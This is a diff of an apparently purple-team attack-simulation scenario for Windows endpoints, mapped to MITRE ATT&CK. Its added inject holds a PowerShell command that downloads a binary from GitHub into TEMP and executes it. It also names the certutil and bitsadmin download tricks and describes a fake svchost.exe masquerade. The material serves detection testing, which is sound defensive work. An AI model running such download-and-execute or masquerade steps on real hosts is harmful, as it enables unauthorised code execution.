@@ -21,6 +21,351 @@
  "scenario_organizations": [],
  "scenario_injects": [
   {
+   "inject_id": "5781d72f-dbb1-537a-80c4-cdf46da2212a",
+   "inject_title": "Ingress Tool Transfer — pull the wld tool onto the host (T1105)",
+   "inject_description": "First step of the chain: fetch the tool-under-test. curl.exe downloads the wld.exe binary from the project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then cleanup removes it. Detection: curl.exe writing a PE to disk and a new process spawning from it (proxy/NDR tool transfer; EDR exec-after-download).",
+   "inject_country": "",
+   "inject_city": "",
+   "inject_enabled": true,
+   "inject_content": {
+    "obfuscator": "plain-text",
+    "expectations": [
+     {
+      "expectation_type": "DETECTION",
+      "expectation_name": "Detection",
+      "expectation_description": null,
+      "expectation_score": 100,
+      "expectation_expectation_group": false,
+      "expectation_expiration_time": 21600
+     }
+    ],
+    "threatops_command_override": "",
+    "threatops_executor_override": "",
+    "threatops_cleanup_executor_override": "",
+    "threatops_cleanup_command_override": ""
+   },
+   "inject_all_teams": false,
+   "inject_depends_on": [],
+   "inject_depends_duration": 0,
+   "inject_injector_contract": {
+    "convertedContent": {
+     "config": {
+      "type": "openaev_implant",
+      "label": {
+       "fr": "OpenAEV Implant",
+       "en": "OpenAEV Implant"
+      },
+      "color_dark": "#000000",
+      "color_light": "#000000"
+     },
+     "label": {
+      "en": "Ingress tool transfer (wld)",
+      "fr": "Ingress tool transfer (wld)"
+     },
+     "manual": false,
+     "fields": [
+      {
+       "key": "assets",
+       "label": "Source assets",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset"
+      },
+      {
+       "key": "asset_groups",
+       "label": "Source asset groups",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": [
+        "assets",
+        "asset_groups"
+       ],
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "type": "asset-group"
+      },
+      {
+       "key": "obfuscator",
+       "label": "Obfuscators",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "1",
+       "defaultValue": [
+        "plain-text"
+       ],
+       "choices": [
+        {
+         "label": "plain-text",
+         "value": "plain-text"
+        },
+        {
+         "label": "base64",
+         "value": "base64"
+        }
+       ],
+       "type": "choice"
+      },
+      {
+       "key": "expectations",
+       "label": "Expectations",
+       "mandatory": false,
+       "readOnly": false,
+       "mandatoryGroups": null,
+       "mandatoryConditionFields": null,
+       "mandatoryConditionValues": null,
+       "visibleConditionFields": null,
+       "visibleConditionValues": null,
+       "linkedFields": [],
+       "linkedValues": [],
+       "cardinality": "n",
+       "defaultValue": [],
+       "predefinedExpectations": [
+        {
+         "expectation_type": "DETECTION",
+         "expectation_name": "Detection",
+         "expectation_description": null,
+         "expectation_score": 100.0,
+         "expectation_expectation_group": false,
+         "expectation_expiration_time": 21600
+        }
+       ],
+       "type": "expectation"
+      }
+     ],
+     "variables": [
+      {
+       "key": "user",
+       "label": "User that will receive the injection",
+       "type": "String",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "user.id",
+         "label": "Id of the user in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.email",
+         "label": "Email of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.firstname",
+         "label": "First name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lastname",
+         "label": "Last name of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "user.lang",
+         "label": "Language of the user",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "exercise",
+       "label": "Exercise of the current injection",
+       "type": "Object",
+       "cardinality": "1",
+       "children": [
+        {
+         "key": "exercise.id",
+         "label": "Id of the exercise in the platform",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.name",
+         "label": "Name of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        },
+        {
+         "key": "exercise.description",
+         "label": "Description of the exercise",
+         "type": "String",
+         "cardinality": "1",
+         "children": []
+        }
+       ]
+      },
+      {
+       "key": "teams",
+       "label": "List of team names for the injection",
+       "type": "String",
+       "cardinality": "n",
+       "children": []
+      },
+      {
+       "key": "player_uri",
+       "label": "Player interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "challenges_uri",
+       "label": "Challenges interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "scoreboard_uri",
+       "label": "Scoreboard interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      },
+      {
+       "key": "lessons_uri",
+       "label": "Lessons learned interface platform link",
+       "type": "String",
+       "cardinality": "1",
+       "children": []
+      }
+     ],
+     "context": {},
+     "atomicTesting": true,
+     "contract_id": "29d9c2ee-4d36-5763-b757-fb87cc2df0e2",
+     "contract_attack_patterns_external_ids": [],
+     "is_atomic_testing": true,
+     "needs_executor": true,
+     "platforms": [
+      "Windows"
+     ],
+     "domains": [
+      {
+       "listened": true,
+       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
+       "domain_name": "Endpoint",
+       "domain_color": "#389CFF",
+       "domain_created_at": "2026-06-02T18:22:45.296458Z",
+       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
+      }
+     ]
+    },
+    "listened": true,
+    "injector_contract_external_id": "d5b0241d-35b9-517d-ba38-94a4596e19d4",
+    "injector_contract_labels": {
+     "en": "Ingress tool transfer (wld)",
+     "fr": "Ingress tool transfer (wld)"
+    },
+    "injector_contract_manual": false,
+    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Ingress tool transfer (wld)\",\"fr\":\"Ingress tool transfer (wld)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"29d9c2ee-4d36-5763-b757-fb87cc2df0e2\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
+    "injector_contract_custom": false,
+    "injector_contract_needs_executor": true,
+    "injector_contract_platforms": [
+     "Windows"
+    ],
+    "injector_contract_tags": [],
+    "injector_contract_payload": {
+     "listened": true,
+     "payload_id": "29b51d6a-f47a-5623-b80f-085467dfef19",
+     "payload_type": "Command",
+     "payload_name": "wetland — Ingress tool transfer (wld)",
+     "payload_description": "First step of the chain: fetch the tool-under-test. curl.exe downloads the wld.exe binary from the project's GitHub and runs `wld -h` (benign — prints usage) to prove download+execute, then cleanup removes it. Detection: curl.exe writing a PE to disk and a new process spawning from it (proxy/NDR tool transfer; EDR exec-after-download).",
+     "payload_platforms": [
+      "Windows"
+     ],
+     "payload_cleanup_executor": "psh",
+     "payload_cleanup_command": "Remove-Item (Join-Path $env:TEMP 'wetland-lab-wld.exe') -Force -ErrorAction SilentlyContinue\nWrite-Output 'WETLAND-LAB ingress: cleaned'\n",
+     "payload_elevation_required": false,
+     "payload_arguments": [],
+     "payload_prerequisites": [],
+     "payload_external_id": "fc05aa32-e1ea-5aa8-be1a-babd091fe658",
+     "payload_source": "MANUAL",
+     "payload_expectations": [
+      "DETECTION"
+     ],
+     "payload_status": "VERIFIED",
+     "payload_execution_arch": "ALL_ARCHITECTURES",
+     "payload_collector_type": null,
+     "payload_detection_remediations": [],
+     "payload_output_parsers": [],
+     "payload_created_at": "2026-10-30T20:02:35.584276Z",
+     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
+     "command_executor": "psh",
+     "command_content": "$url = 'https://raw.githubusercontent.com/s4nntysec/wetland/main/dist/release/wld-windows-x86_64.exe'\n# (swap to a Release once published: .../releases/latest/download/wld-windows-x86_64.exe)\n$dst = Join-Path $env:TEMP 'wetland-lab-wld.exe'\ntry {\n  curl.exe -fsSL -o $dst $url\n  if (Test-Path $dst) {\n    Write-Output \"WETLAND-LAB ingress: downloaded wld.exe via curl.exe -> $dst (T1105)\"\n    & $dst -h 2>&1 | Select-Object -First 2\n  } else { Write-Output 'WETLAND-LAB ingress: no file written (proxy/AV?) — valid detection' }\n} catch { Write-Output 'WETLAND-LAB ingress: download blocked by proxy/AV — valid detection' }\nWrite-Output 'detect: curl.exe writing a PE to disk then executing it; proxy/NDR tool transfer; EDR exec-after-download'\nWrite-Output 'alt LOLBins: certutil -urlcache -f <url> <out> ; bitsadmin /transfer'\n"
+    },
+    "injector_contract_created_at": "2026-10-30T20:02:35.585585Z",
+    "injector_contract_updated_at": "2026-10-30T20:02:35.585588Z",
+    "injector_contract_attack_patterns": [
+     {
+      "attack_pattern_id": "9b8e4bdb-fbbd-5cbd-acf2-e604fedc49e2",
+      "attack_pattern_name": "Ingress Tool Transfer",
+      "attack_pattern_description": "MITRE ATT&CK technique exercised by the wetland purple-team lab.",
+      "attack_pattern_external_id": "T1105",
+      "attack_pattern_kill_chain_phases": []
+     }
+    ],
+    "injector_contract_domains": [
+     "683fb18c-5200-4aec-b618-6ded488d3cde"
+    ],
+    "injector_contract_vulnerabilities": [],
+    "injector_contract_atomic_testing": true,
+    "injector_contract_import_available": false,
+    "injector_contract_id": "29d9c2ee-4d36-5763-b757-fb87cc2df0e2",
+    "injector_contract_injector_type": "openaev_implant",
+    "injector_contract_arch": "ALL_ARCHITECTURES",
+    "injector_contract_payload_status": "VERIFIED",
+    "injector_contract_injectors": [
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144",
+     "49229430-b5b5-431f-ba5b-f36f599b0144"
+    ],
+    "injector_contract_injector_names": {
+     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
+    }
+   },
+   "inject_tags": [],
+   "inject_teams": [],
+   "inject_documents": []
+  },
+  {
    "inject_id": "b99384a0-fea9-5bab-b50e-cbe8dce9fe73",
    "inject_title": "Masquerade — fake svchost.exe from a user path (T1036)",
    "inject_description": "Purple-team sim of `wld -M` / `wld lab masquerade` on Windows: copies a benign system binary to a user-writable path named svchost.exe and runs it briefly. Detection: an image named svchost.exe running outside System32 with a parent that is not services.exe.",
@@ -46,7 +391,7 @@
    },
    "inject_all_teams": false,
    "inject_depends_on": [],
-   "inject_depends_duration": 0,
+   "inject_depends_duration": 60,
    "inject_injector_contract": {
     "convertedContent": {
      "config": {
@@ -398,7 +743,7 @@
    },
    "inject_all_teams": false,
    "inject_depends_on": [],
-   "inject_depends_duration": 60,
+   "inject_depends_duration": 120,
    "inject_injector_contract": {
     "convertedContent": {
      "config": {
@@ -743,7 +1088,7 @@
    },
    "inject_all_teams": false,
    "inject_depends_on": [],
-   "inject_depends_duration": 120,
+   "inject_depends_duration": 180,
    "inject_injector_contract": {
     "convertedContent": {
      "config": {
@@ -1088,7 +1433,7 @@
    },
    "inject_all_teams": false,
    "inject_depends_on": [],
-   "inject_depends_duration": 180,
+   "inject_depends_duration": 240,
    "inject_injector_contract": {
     "convertedContent": {
      "config": {
@@ -1440,7 +1785,7 @@
    },
    "inject_all_teams": false,
    "inject_depends_on": [],
-   "inject_depends_duration": 240,
+   "inject_depends_duration": 300,
    "inject_injector_contract": {
     "convertedContent": {
      "config": {
@@ -1748,351 +2093,6 @@
     "injector_contract_atomic_testing": true,
     "injector_contract_import_available": false,
     "injector_contract_id": "a5637388-8f20-590c-b818-077ea175635f",
-    "injector_contract_injector_type": "openaev_implant",
-    "injector_contract_arch": "ALL_ARCHITECTURES",
-    "injector_contract_payload_status": "VERIFIED",
-    "injector_contract_injectors": [
-     "49229430-b5b5-431f-ba5b-f36f599b0144",
-     "49229430-b5b5-431f-ba5b-f36f599b0144",
-     "49229430-b5b5-431f-ba5b-f36f599b0144",
-     "49229430-b5b5-431f-ba5b-f36f599b0144",
-     "49229430-b5b5-431f-ba5b-f36f599b0144"
-    ],
-    "injector_contract_injector_names": {
-     "49229430-b5b5-431f-ba5b-f36f599b0144": "OpenAEV Implant"
-    }
-   },
-   "inject_tags": [],
-   "inject_teams": [],
-   "inject_documents": []
-  },
-  {
-   "inject_id": "dc8aa719-593a-5ac2-a01a-d3db9a8fbfe4",
-   "inject_title": "Ingress Tool Transfer — benign EICAR download test (T1105)",
-   "inject_description": "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
-   "inject_country": "",
-   "inject_city": "",
-   "inject_enabled": true,
-   "inject_content": {
-    "obfuscator": "plain-text",
-    "expectations": [
-     {
-      "expectation_type": "DETECTION",
-      "expectation_name": "Detection",
-      "expectation_description": null,
-      "expectation_score": 100,
-      "expectation_expectation_group": false,
-      "expectation_expiration_time": 21600
-     }
-    ],
-    "threatops_command_override": "",
-    "threatops_executor_override": "",
-    "threatops_cleanup_executor_override": "",
-    "threatops_cleanup_command_override": ""
-   },
-   "inject_all_teams": false,
-   "inject_depends_on": [],
-   "inject_depends_duration": 300,
-   "inject_injector_contract": {
-    "convertedContent": {
-     "config": {
-      "type": "openaev_implant",
-      "label": {
-       "fr": "OpenAEV Implant",
-       "en": "OpenAEV Implant"
-      },
-      "color_dark": "#000000",
-      "color_light": "#000000"
-     },
-     "label": {
-      "en": "Ingress tool transfer (EICAR)",
-      "fr": "Ingress tool transfer (EICAR)"
-     },
-     "manual": false,
-     "fields": [
-      {
-       "key": "assets",
-       "label": "Source assets",
-       "mandatory": false,
-       "readOnly": false,
-       "mandatoryGroups": [
-        "assets",
-        "asset_groups"
-       ],
-       "mandatoryConditionFields": null,
-       "mandatoryConditionValues": null,
-       "visibleConditionFields": null,
-       "visibleConditionValues": null,
-       "linkedFields": [],
-       "linkedValues": [],
-       "cardinality": "n",
-       "defaultValue": [],
-       "type": "asset"
-      },
-      {
-       "key": "asset_groups",
-       "label": "Source asset groups",
-       "mandatory": false,
-       "readOnly": false,
-       "mandatoryGroups": [
-        "assets",
-        "asset_groups"
-       ],
-       "mandatoryConditionFields": null,
-       "mandatoryConditionValues": null,
-       "visibleConditionFields": null,
-       "visibleConditionValues": null,
-       "linkedFields": [],
-       "linkedValues": [],
-       "cardinality": "n",
-       "defaultValue": [],
-       "type": "asset-group"
-      },
-      {
-       "key": "obfuscator",
-       "label": "Obfuscators",
-       "mandatory": false,
-       "readOnly": false,
-       "mandatoryGroups": null,
-       "mandatoryConditionFields": null,
-       "mandatoryConditionValues": null,
-       "visibleConditionFields": null,
-       "visibleConditionValues": null,
-       "linkedFields": [],
-       "linkedValues": [],
-       "cardinality": "1",
-       "defaultValue": [
-        "plain-text"
-       ],
-       "choices": [
-        {
-         "label": "plain-text",
-         "value": "plain-text"
-        },
-        {
-         "label": "base64",
-         "value": "base64"
-        }
-       ],
-       "type": "choice"
-      },
-      {
-       "key": "expectations",
-       "label": "Expectations",
-       "mandatory": false,
-       "readOnly": false,
-       "mandatoryGroups": null,
-       "mandatoryConditionFields": null,
-       "mandatoryConditionValues": null,
-       "visibleConditionFields": null,
-       "visibleConditionValues": null,
-       "linkedFields": [],
-       "linkedValues": [],
-       "cardinality": "n",
-       "defaultValue": [],
-       "predefinedExpectations": [
-        {
-         "expectation_type": "DETECTION",
-         "expectation_name": "Detection",
-         "expectation_description": null,
-         "expectation_score": 100.0,
-         "expectation_expectation_group": false,
-         "expectation_expiration_time": 21600
-        }
-       ],
-       "type": "expectation"
-      }
-     ],
-     "variables": [
-      {
-       "key": "user",
-       "label": "User that will receive the injection",
-       "type": "String",
-       "cardinality": "1",
-       "children": [
-        {
-         "key": "user.id",
-         "label": "Id of the user in the platform",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "user.email",
-         "label": "Email of the user",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "user.firstname",
-         "label": "First name of the user",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "user.lastname",
-         "label": "Last name of the user",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "user.lang",
-         "label": "Language of the user",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        }
-       ]
-      },
-      {
-       "key": "exercise",
-       "label": "Exercise of the current injection",
-       "type": "Object",
-       "cardinality": "1",
-       "children": [
-        {
-         "key": "exercise.id",
-         "label": "Id of the exercise in the platform",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "exercise.name",
-         "label": "Name of the exercise",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        },
-        {
-         "key": "exercise.description",
-         "label": "Description of the exercise",
-         "type": "String",
-         "cardinality": "1",
-         "children": []
-        }
-       ]
-      },
-      {
-       "key": "teams",
-       "label": "List of team names for the injection",
-       "type": "String",
-       "cardinality": "n",
-       "children": []
-      },
-      {
-       "key": "player_uri",
-       "label": "Player interface platform link",
-       "type": "String",
-       "cardinality": "1",
-       "children": []
-      },
-      {
-       "key": "challenges_uri",
-       "label": "Challenges interface platform link",
-       "type": "String",
-       "cardinality": "1",
-       "children": []
-      },
-      {
-       "key": "scoreboard_uri",
-       "label": "Scoreboard interface platform link",
-       "type": "String",
-       "cardinality": "1",
-       "children": []
-      },
-      {
-       "key": "lessons_uri",
-       "label": "Lessons learned interface platform link",
-       "type": "String",
-       "cardinality": "1",
-       "children": []
-      }
-     ],
-     "context": {},
-     "atomicTesting": true,
-     "contract_id": "8a25fab1-db21-5677-a064-99639c8d8215",
-     "contract_attack_patterns_external_ids": [],
-     "is_atomic_testing": true,
-     "needs_executor": true,
-     "platforms": [
-      "Windows"
-     ],
-     "domains": [
-      {
-       "listened": true,
-       "domain_id": "683fb18c-5200-4aec-b618-6ded488d3cde",
-       "domain_name": "Endpoint",
-       "domain_color": "#389CFF",
-       "domain_created_at": "2026-06-02T18:22:45.296458Z",
-       "domain_updated_at": "2026-06-02T18:22:45.296458Z"
-      }
-     ]
-    },
-    "listened": true,
-    "injector_contract_external_id": "eb43ee82-81ce-506c-8910-9bcd355dac50",
-    "injector_contract_labels": {
-     "en": "Ingress tool transfer (EICAR)",
-     "fr": "Ingress tool transfer (EICAR)"
-    },
-    "injector_contract_manual": false,
-    "injector_contract_content": "{\"config\":{\"type\":\"openaev_implant\",\"label\":{\"fr\":\"OpenAEV Implant\",\"en\":\"OpenAEV Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Ingress tool transfer (EICAR)\",\"fr\":\"Ingress tool transfer (EICAR)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Source assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"asset_groups\",\"label\":\"Source asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"asset_groups\"],\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\"},{\"label\":\"base64\",\"value\":\"base64\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionFields\":null,\"mandatoryConditionValues\":null,\"visibleConditionFields\":null,\"visibleConditionValues\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the exercise in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team names for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"atomicTesting\":true,\"contract_id\":\"8a25fab1-db21-5677-a064-99639c8d8215\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"],\"domains\":[{\"listened\":true,\"domain_id\":\"683fb18c-5200-4aec-b618-6ded488d3cde\",\"domain_name\":\"Endpoint\",\"domain_color\":\"#389CFF\",\"domain_created_at\":\"2026-06-02T18:22:45.296458Z\",\"domain_updated_at\":\"2026-06-02T18:22:45.296458Z\"}]}",
-    "injector_contract_custom": false,
-    "injector_contract_needs_executor": true,
-    "injector_contract_platforms": [
-     "Windows"
-    ],
-    "injector_contract_tags": [],
-    "injector_contract_payload": {
-     "listened": true,
-     "payload_id": "d988f8bb-1818-5276-a4ec-8b5f83e63b05",
-     "payload_type": "Command",
-     "payload_name": "wetland — Ingress tool transfer (EICAR)",
-     "payload_description": "Detection test for 'a tool is pulled onto the host': curl.exe downloads the EICAR AV test file (an industry-standard, deliberately harmless detection artifact — NOT the wld binary) to a WETLAND-LAB temp path, then cleanup removes it. Exercises proxy/NDR tool-transfer and endpoint AV on-write. Blue team can also test the LOLBins certutil and bitsadmin.",
-     "payload_platforms": [
-      "Windows"
-     ],
-     "payload_cleanup_executor": "psh",
-     "payload_cleanup_command": "Remove-Item (Join-Path $env:TEMP 'wetland-lab-eicar.txt') -Force -ErrorAction SilentlyContinue\nWrite-Output 'WETLAND-LAB ingress: cleaned'\n",
-     "payload_elevation_required": false,
-     "payload_arguments": [],
-     "payload_prerequisites": [],
-     "payload_external_id": "47942c3b-6105-5de5-b605-b4104f4a38e8",
-     "payload_source": "MANUAL",
-     "payload_expectations": [
-      "DETECTION"
-     ],
-     "payload_status": "VERIFIED",
-     "payload_execution_arch": "ALL_ARCHITECTURES",
-     "payload_collector_type": null,
-     "payload_detection_remediations": [],
-     "payload_output_parsers": [],
-     "payload_created_at": "2026-10-30T20:02:35.584276Z",
-     "payload_updated_at": "2026-10-30T20:02:35.584290Z",
-     "command_executor": "psh",
